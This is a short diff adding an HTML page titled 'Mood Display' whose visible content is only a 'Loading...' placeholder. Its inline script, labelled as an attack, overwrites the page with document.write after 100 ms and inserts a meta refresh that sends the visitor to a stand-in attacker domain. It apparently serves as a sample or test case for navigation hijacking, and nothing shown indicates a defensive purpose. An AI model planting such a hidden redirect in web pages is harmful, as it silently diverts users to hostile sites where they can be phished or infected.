@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Mood Display</title>
+</head>
+<body>
+  <div id="root">Loading...</div>
+  <script>
+    // Attack: Navigation hijack via document.write
+    function hijackNav() {
+      // Clear page and redirect
+      document.write('<!DOCTYPE html><html><head>');
+      document.write('<meta http-equiv="refresh" content="0;url=https://evil.example.com">');
+      document.write('</head><body>Redirecting...</body></html>');
+      document.close();
+    }
+    
+    // Trigger on next event loop
+    setTimeout(hijackNav, 100);
+  </script>
+</body>
+</html>
